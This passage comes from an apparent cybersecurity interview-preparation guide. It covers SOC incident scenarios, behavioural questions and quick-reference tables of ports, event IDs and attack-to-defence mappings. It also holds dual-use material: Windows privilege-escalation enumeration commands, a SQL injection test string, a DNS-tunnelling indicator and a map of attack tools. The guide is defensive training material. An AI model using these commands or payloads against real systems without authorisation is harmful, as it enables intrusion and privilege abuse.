1. **Identify:** This pattern = brute force attack that succeeded. Treat as confirmed compromise.
2. **Gather information immediately:**
   - What account? (Regular user vs admin — severity differs enormously)
   - Source IP(s) of the failed logins — single IP (simple brute force) or many IPs (distributed/credential stuffing)?
   - Is the successful login from the same IP or different?
   - Is the source IP internal or external?
   - What resource was logged into? (VPN, web app, domain auth?)
3. **Immediate containment:** Disable the compromised account. Block the source IP(s) at the perimeter.
4. **Investigate the successful session:** What did this account do after logging in? Check subsequent 4688, 4672, 4698 events.
5. **Assess blast radius:** Has the account's credentials been used elsewhere?
6. **Escalate** to IR team and management if admin account or sensitive system.
7. **Document everything** with timestamps.

---

**SCENARIO Q2. Three workstations start encrypting files rapidly across network shares. What are your first actions?**

**Thought process — speed matters here:**
1. **Ransomware assessment:** This pattern (rapid file encryption across shares) = ransomware spreading. Time is critical.
2. **Immediate containment:** Isolate affected workstations from network — physically disconnect or use EDR/NAC to quarantine. Do NOT shut them down immediately (lose RAM evidence including potential encryption keys).
3. **Preserve RAM:** Memory dump if time permits before isolation — may contain encryption keys.
4. **Identify patient zero:** Which machine started encrypting first? Check logs for the earliest events.
5. **Assess spread:** Query EDR for other hosts showing similar behaviour. How far has it spread?
6. **Notify:** Alert management, IR team, legal. Potential regulatory notification obligations.
7. **Check backups:** Are they intact? Are they offline/offsite (not reachable by ransomware)?
8. **Do not pay** ransom without legal/management guidance.
9. **Identify the initial vector:** Phishing email? Exposed RDP? Vulnerable VPN?

---

**SCENARIO Q3. An employee reports their machine is slow. Your EDR shows: powershell.exe was spawned by winword.exe, which then spawned cmd.exe, then net.exe. What is happening?**

**Analysis:**
- `winword.exe` (Word) spawning `powershell.exe` = **macro-based malware** — user opened a malicious Word document with an embedded macro
- PowerShell spawning cmd.exe = PowerShell executing system commands
- cmd.exe spawning net.exe = network reconnaissance (`net user`, `net group`, `net view`)

**What to do:**
1. Immediately isolate the machine from the network
2. Preserve the Word document (evidence)
3. Memory dump for forensic analysis
4. Check what commands were actually run (Event ID 4688 command-line, PowerShell 4104 logs)
5. Check for network connections from that machine (C2 callback?)
6. Check if the account has been used to authenticate anywhere else (lateral movement)
7. Begin IR process, identify the malicious document source (email, USB, web download)

---

**SCENARIO Q4. You notice a server making DNS queries for `aGVsbG8=.data.attacker.com` repeatedly. What do you suspect and what do you do?**

**Analysis:**
- `aGVsbG8=` is a base64-encoded string
- DNS queries with base64-looking subdomains to an external domain = **DNS tunneling / C2 communication**
- The server is likely compromised and communicating with an attacker's DNS server covertly

**Actions:**
1. Immediately isolate the server
2. Block the domain at DNS/firewall level
3. Identify what process is making the DNS queries (look at process making network calls)
4. Decode the base64 strings — what data was being sent?
5. Check how long this has been happening (scope of exfiltration)
6. Memory and disk forensics to identify the malware
7. Begin full IR process

---

**SCENARIO Q5. You're a new SOC analyst and your senior says an APT group is targeting your industry. How do you use this intelligence operationally?**

**Thought process:**
1. **Research the APT group:** MITRE ATT&CK, threat intel feeds (ISACs, vendor reports). Identify their known TTPs, preferred initial access methods, C2 infrastructure patterns.
2. **Gap analysis:** Which of their known techniques do we have detections for? Which don't we?
3. **Hunt proactively:** Build hunting hypotheses based on their TTPs. If they're known to use PowerShell for lateral movement — hunt for unusual PowerShell activity.
4. **Detection rules:** Write/update SIEM rules mapped to their specific techniques.
5. **Indicator blocking:** Import known bad IPs, domains, file hashes into security controls.
6. **Phishing simulation:** If they use spear phishing — consider a targeted awareness exercise.
7. **Tabletop exercise:** Simulate their attack chain with the IR team.

---

**SCENARIO Q6. During a penetration test, you've gained access to a Windows workstation as a standard user. What is your privilege escalation methodology?**

**Enumeration first — always:**
1. `whoami /all` — Current privileges and group memberships
2. `net user` and `net localgroup administrators` — Local users and admins
3. `systeminfo` — OS version, patches (check for known kernel exploits)
4. Check `AlwaysInstallElevated` registry key — allows MSI install as SYSTEM
5. Check for unquoted service paths — `wmic service get name,pathname` 
6. Check writable directories in service paths
7. Check for stored credentials: `cmdkey /list`, credential manager
8. Check scheduled tasks: `schtasks /query /fo LIST /v`
9. Check running services for misconfigurations
10. Use automated tools: **WinPEAS** to enumerate all potential vectors

---

**SCENARIO Q7. You discover a critical SQL injection vulnerability in a production web application. What do you report and what should be done?**

**Report should include:**
- Vulnerability description with CVE reference if applicable
- Affected URL and parameter
- Proof of concept (showing impact without causing harm — e.g., `'OR'1'='1` returning extra data)
- CVSS score and severity rating
- Potential impact (data theft, auth bypass, DB destruction)
- Remediation recommendation: parameterised queries / prepared statements
- Temporary mitigation (WAF rule) while fix is developed

**Response process:**
1. Immediate notification to application owner and security team
2. Temporary WAF rule to block exploitation (NOT a fix)
3. Developer implements parameterised queries
4. Code review for similar patterns across the application
5. Regression testing
6. Scheduled rescan to verify remediation

---

**SCENARIO Q8. Your company's CEO receives an urgent email appearing to be from the CFO asking for an immediate $50,000 wire transfer. What type of attack is this and what controls prevent it?**

**Attack type:** **Business Email Compromise (BEC) / Whaling** — CEO fraud. A type of spear phishing targeting executives for financial fraud.

**Why it works:** Urgency, authority (CFO), trust (internal appearance).

**Technical controls:**
- DMARC, DKIM, SPF — prevent email spoofing
- Email gateway rules flagging external emails with internal display names
- MFA on email accounts

**Process controls:**
- **Dual authorisation** for wire transfers above a threshold
- Out-of-band verification (call the CFO on a known number, not one in the email)
- Employee training — especially finance and executive assistants

---

## 17. BEHAVIORAL & SITUATIONAL QUESTIONS

> **Why this matters:** Technical skills get you considered. Communication, judgement, and professionalism get you hired. These questions reveal how you think, handle pressure, and work with others.

---

**Q139. How do you explain a complex security vulnerability to a non-technical executive?**

**Framework:** Business impact first, then the threat, then the solution — in plain language.

> **Bad answer:** "We have a SQL injection vulnerability with a CVSS score of 9.8 affecting our PostgreSQL backend."
>
> **Good answer:** "There's a flaw in our website that could allow an attacker to extract our entire customer database, including personal information, in minutes. This could result in regulatory fines, customer lawsuits, and serious reputational damage. It's a known type of issue and our developers can fix it within 48 hours. In the meantime, we can add a temporary protective layer."

---

**Q140. A developer says "security is slowing down the development process." How do you respond?**

**Collaborative, not confrontational:**

Acknowledge their concern — security reviews do add time. Then reframe: a breach causes far more delay and cost than a security review. Propose solutions: shift-left security (integrate security early, not at the end), developer security training, automated scanning in CI/CD pipelines, threat modelling at design stage. The goal is to be an enabler, not a gatekeeper.

---

**Q141. You discover that a colleague has been accessing systems they're not authorised to. What do you do?**

1. Do NOT confront the colleague directly
2. Document your findings (screenshots, log excerpts) with timestamps
3. Report to your direct manager and/or security team lead immediately
4. Follow your company's Acceptable Use Policy and IR procedures
5. Maintain confidentiality — don't discuss with other colleagues
6. Cooperate fully with any investigation
7. Preserve evidence — do not delete anything

> **Key principle:** This is an insider threat situation. It must be handled through proper channels with evidence preserved for a potential HR or legal process.

---

**Q142. How do you stay current with cybersecurity threats and news?**

Strong answer demonstrates genuine engagement with the field:

- **Threat intel feeds:** CISA advisories, US-CERT, vendor bulletins (Microsoft MSRC, CrowdStrike)
- **Communities:** r/netsec, Twitter/X security community, LinkedIn
- **Research:** Blogs (SpecterOps, Google Project Zero, Krebs on Security)
- **CTF competitions:** Hack The Box, TryHackMe, picoCTF
- **Certifications:** Studying for CompTIA Security+, CEH, OSCP
- **Podcasts/News:** Risky Business, Darknet Diaries, SANS Internet Stormcast

---

**Q143. Describe a time you made a mistake in a technical task and how you handled it.**

**What interviewers want:** Honesty, accountability, learning mindset.

**STAR format:** Situation → Task → Action → Result

> **Template:** "During [X], I mistakenly [action]. I immediately recognised the mistake and [what you did to fix it]. I notified [relevant party] and [steps taken]. As a result of this, I now [what process/check you added to prevent recurrence]."

The worst answer is claiming you've never made a mistake.

---

**Q144. What would you do if you were asked by a manager to do something that violated security policy?**

**Approach:** Professional, not adversarial.

1. Seek to understand the business need driving the request
2. Explain the security risk clearly and its potential business impact
3. Propose a compliant alternative that meets the business need
4. If pressure persists, escalate to security leadership or through formal risk acceptance process (documented exception)
5. If it appears to be a deliberate circumvention, consult the ethics/compliance channel

> **Never:** Silently comply with a policy violation. The risk is yours professionally if something goes wrong.

---

**Q145. Where do you see yourself in 3 years within cybersecurity?**

Good answers show direction without being rigidly fixed — and connect to the role you're interviewing for.

> **Example:** "In the near term I want to build strong foundational skills in SOC operations and incident response — understanding threats from the defence side. In 2-3 years I'd like to pursue an offensive certification like OSCP to understand attacker techniques more deeply, which will make me a better defender. Long-term, I'm interested in specialising in threat intelligence and detection engineering."

---

## QUICK REFERENCE: EXAM-CRITICAL FACTS

### Ports You Must Know Cold
```
22=SSH  23=Telnet  25=SMTP  53=DNS  80=HTTP  443=HTTPS
445=SMB  3389=RDP  389=LDAP  636=LDAPS  1433=MSSQL  3306=MySQL
```

### Event IDs You Must Know Cold
```
4624=Login success   4625=Login failure   4648=Explicit credential use
4672=Special privileges  4688=Process created  4698=Scheduled task created
4697=Service installed   4720=Account created  4728/32/56=Group membership added
1102=Log cleared (CRITICAL)  7045=Service installed (System log)
4769=Kerberos TGT-SVC requested (Kerberoasting)
```

### Attack → Defence Quick Map
```
ARP Spoofing      → Dynamic ARP Inspection (DAI), 802.1X
LLMNR Poisoning   → Disable LLMNR/NetBIOS via GPO
NTLM Relay        → Enable SMB Signing
Kerberoasting     → gMSA (Managed Service Accounts)
Pass-the-Hash     → Credential Guard, disable NTLM
Brute Force       → Account lockout, MFA, rate limiting
Phishing          → DMARC/DKIM/SPF, user training, email filtering
SQL Injection     → Parameterised queries
XSS               → Output encoding, CSP headers
Rainbow Tables    → Salting + bcrypt/Argon2
```

### Hash Algorithm Decision Guide
```
Password storage:    Argon2 > bcrypt > scrypt  (slow = good)
File integrity:      SHA-256 or SHA-3          (fast = good)
Digital signatures:  SHA-256 with RSA/ECDSA
AVOID:               MD5, SHA-1 for any security purpose
```

### OSI Layer → Attack → Tool Map
```
L2: ARP Spoofing → Ettercap, arpspoof
L3: IP Spoofing, routing → Hping3
L4: SYN Flood → hping3, scapy
L7: SQLi, XSS, CSRF → SQLmap, Burp Suite
```

---

*End of Guide — 200 Questions*

---

> **Final advice:** When you don't know an answer, don't fabricate. Say: "I haven't worked with that specific technology directly, but based on my understanding of [related concept], I would expect it to work by..." Intellectual honesty combined with reasoning capability is far more impressive than a confident wrong answer — and far more reflective of how real security work happens.

> **Good luck with your interview at the Azerbaijani Cybersecurity Center.** The fact that you're preparing this thoroughly already puts you ahead of most candidates who walk in relying on what they half-remember.
